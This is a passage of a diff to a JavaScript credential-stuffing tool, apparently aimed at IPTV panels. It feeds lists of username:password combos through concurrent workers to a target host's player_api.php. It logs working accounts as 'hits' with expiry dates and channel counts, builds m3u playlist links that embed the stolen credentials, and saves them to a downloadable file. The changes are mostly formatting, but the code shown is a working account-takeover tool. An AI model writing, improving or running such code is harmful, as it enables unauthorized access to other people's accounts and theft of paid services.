         const hasHost = !!hostInput.value.trim();
         startBtn.disabled = !(hasHost && (combos1.length || combos2.length || combos3.length || combosTxt.length));
     }
 
-    async function processarCombosJob(host, combos, conc, jobId){
+    async function processarCombosJob(host, combos, conc, jobId) {
         let total = combos.length, processed = 0, index = 0;
         const fill = document.getElementById(jobId === 1 ? 'progressBarFill' : (jobId === 2 ? 'progressBarFill2' : 'progressBarFill3'));
         const txt = document.getElementById(jobId === 1 ? 'progressText' : (jobId === 2 ? 'progressText2' : 'progressText3'));
         const userDisp = document.getElementById(jobId === 1 ? 'currentCombo' : (jobId === 2 ? 'currentCombo2' : 'currentCombo3'));
         const countSpan = document.getElementById(jobId === 1 ? 'hitsCount1' : (jobId === 2 ? 'hitsCount2' : 'hitsCount3'));
 
-        async function worker(){
-            while(index < total && !stopRequested){
-                const i = index++; if(i >= total) break;
-                const pair = extractCombo(combos[i]); if(!pair) continue;
+        async function worker() {
+            while (index < total && !stopRequested) {
+                const i = index++; if (i >= total) break;
+                const pair = extractCombo(combos[i]); if (!pair) continue;
                 const [user, pass] = pair;
                 userDisp.textContent = `Usuario: ${user}:${pass}`;
                 try {
                     const url = `http://${host}/player_api.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}`;
                     const res = await fetchWithCors(url, { cache: 'no-store' });
                     const data = await res.json();
-                    if(data && data.user_info && (data.user_info.status === 'Active' || data.user_info.auth == 1)) {
+                    if (data && data.user_info && (data.user_info.status === 'Active' || data.user_info.auth == 1)) {
                         playMoanSound();
                         const info = data.user_info;
                         const expDate = info.exp_date ? new Date(info.exp_date * 1000).toLocaleString('sv-SE') : 'Ilimitado';
-                        
-                        // Extraer canales, películas y series desde diferentes campos posibles
-                        let liveChannels = 0;
-                        let movies = 0;
-                        let series = 0;
-                        
-                        if (data.available_channels && Array.isArray(data.available_channels)) {
-                            liveChannels = data.available_channels.length;
-                        } else if (data.total_channels) {
-                            liveChannels = data.total_channels;
-                        } else if (data.channels_count) {
-                            liveChannels = data.channels_count;
-                        }
-                        
-                        if (data.movies_count) {
-                            movies = data.movies_count;
-                        } else if (data.total_movies) {
-                            movies = data.total_movies;
-                        }
-                        
-                        if (data.series_count) {
-                            series = data.series_count;
-                        } else if (data.total_series) {
-                            series = data.total_series;
-                        }
-                        
+
+                        let liveChannels = 0, movies = 0, series = 0;
+                        if (data.available_channels && Array.isArray(data.available_channels)) liveChannels = data.available_channels.length;
+                        else if (data.total_channels) liveChannels = data.total_channels;
+                        else if (data.channels_count) liveChannels = data.channels_count;
+                        if (data.movies_count) movies = data.movies_count;
+                        else if (data.total_movies) movies = data.total_movies;
+                        if (data.series_count) series = data.series_count;
+                        else if (data.total_series) series = data.total_series;
+
                         const texto = `Host ➤ http://${host}
 ├── Dominio ➤ http://${host.split(':')[0]}
 ├── User ➤ ${user}
@@ -919,7 +1198,6 @@
 
 ╭─➤ 🄼➂🅄 
 ├  http://${host}/get.php?username=${user}&password=${pass}&type=m3u_plus`;
-                        
                         HITS[jobId].push({ user, pass, texto });
                         countSpan.innerHTML = `Hits: <span class="yellow-hit">${HITS[jobId].length}</span>`;
                         const div = document.createElement('div');
@@ -928,10 +1206,10 @@
                         hitsContainer.prepend(div);
                         guardarHitEnBanco(texto, user, pass);
                     }
-                } catch(e) {}
+                } catch (e) { }
                 finally {
                     processed++;
-                    fill.style.width = ((processed/total)*100) + '%';
+                    fill.style.width = ((processed / total) * 100) + '%';
                     txt.textContent = `Procesados: ${processed} / ${total}`;
                 }
             }
@@ -939,13 +1217,13 @@
         await Promise.all(Array.from({ length: conc }, () => worker()));
     }
 
-    function readTxtFile(inputEl, targetArray){
+    function readTxtFile(inputEl, targetArray) {
         targetArray.length = 0;
         const f = inputEl.files?.[0];
-        if(!f){ updateStartState(); return; }
+        if (!f) { updateStartState(); return; }
         const r = new FileReader();
         r.onload = e => {
-            String(e.target.result).split(/\r?\n/).forEach(l => { if(extractCombo(l)) targetArray.push(l); });
+            String(e.target.result).split(/\r?\n/).forEach(l => { if (extractCombo(l)) targetArray.push(l); });
             updateStartState();
         };
         r.readAsText(f);
@@ -956,33 +1234,33 @@
     comboFile3.addEventListener('change', () => readTxtFile(comboFile3, combos3));
     comboText.addEventListener('input', () => {
         combosTxt.length = 0;
-        comboText.value.split(/\r?\n/).forEach(l => { if(extractCombo(l)) combosTxt.push(l); });
+        comboText.value.split(/\r?\n/).forEach(l => { if (extractCombo(l)) combosTxt.push(l); });
         updateStartState();
     });
     hostInput.addEventListener('input', updateStartState);
 
     startBtn.addEventListener('click', async () => {
-        if(isRunning) return;
-        if(moanAudioContext && moanAudioContext.state === 'suspended') await moanAudioContext.resume();
+        if (isRunning) return;
+        if (moanAudioContext && moanAudioContext.state === 'suspended') await moanAudioContext.resume();
         isRunning = true; stopRequested = false;
         startBtn.disabled = true; stopBtn.disabled = false;
-        if(combosTxt.length) { combos1 = combos1.concat(combosTxt); combosTxt = []; }
-        const host = hostInput.value.replace(/^https?:\/\//,'').trim();
+        if (combosTxt.length) { combos1 = combos1.concat(combosTxt); combosTxt = []; }
+        const host = hostInput.value.replace(/^https?:\/\//, '').trim();
         const conc = parseInt(concurrencyInput.value) || 80;
         const jobs = [];
-        if(combos1.length) jobs.push(processarCombosJob(host, combos1, Math.floor(conc/3)||20, 1));
-        if(combos2.length) jobs.push(processarCombosJob(host, combos2, Math.floor(conc/3)||20, 2));
-        if(combos3.length) jobs.push(processarCombosJob(host, combos3, Math.floor(conc/3)||20, 3));
+        if (combos1.length) jobs.push(processarCombosJob(host, combos1, Math.floor(conc / 3) || 20, 1));
+        if (combos2.length) jobs.push(processarCombosJob(host, combos2, Math.floor(conc / 3) || 20, 2));
+        if (combos3.length) jobs.push(processarCombosJob(host, combos3, Math.floor(conc / 3) || 20, 3));
         Promise.allSettled(jobs).then(() => {
             isRunning = false; stopBtn.disabled = true; startBtn.disabled = false; saveBtn.disabled = false;
-            if(document.getElementById('autoDownload').checked) {
+            if (document.getElementById('autoDownload').checked) {
                 const allHits = [...HITS[1], ...HITS[2], ...HITS[3]];
-                if(allHits.length) {
+                if (allHits.length) {
                     let content = allHits.map(h => h.texto).join('\n\n================\n\n');
-                    const blob = new Blob([content], {type: 'text/plain'});
+                    const blob = new Blob([content], { type: 'text/plain' });
                     const a = document.createElement('a');
                     a.href = URL.createObjectURL(blob);
-                    a.download = `scan_${host}_${new Date().toISOString().slice(0,19)}.txt`;
+                    a.download = `scan_${host}_${new Date().toISOString().slice(0, 19)}.txt`;
                     a.click();
                 }
             }
@@ -992,12 +1270,12 @@
     stopBtn.addEventListener('click', () => { stopRequested = true; });
     saveBtn.addEventListener('click', () => {
         const allHits = [...HITS[1], ...HITS[2], ...HITS[3]];
-        if(!allHits.length) { alert("No hay hits para guardar."); return; }
+        if (!allHits.length) { alert("No hay hits para guardar."); return; }
         let content = allHits.map(h => h.texto).join('\n\n================\n\n');
-        const blob = new Blob([content], {type: 'text/plain'});
+        const blob = new Blob([content], { type: 'text/plain' });
         const a = document.createElement('a');
         a.href = URL.createObjectURL(blob);
-        a.download = `scan_${hostInput.value.replace(/[^a-z0-9]/gi,'_')}_${Date.now()}.txt`;
+        a.download = `scan_${hostInput.value.replace(/[^a-z0-9]/gi, '_')}_${Date.now()}.txt`;
         a.click();
     });
 
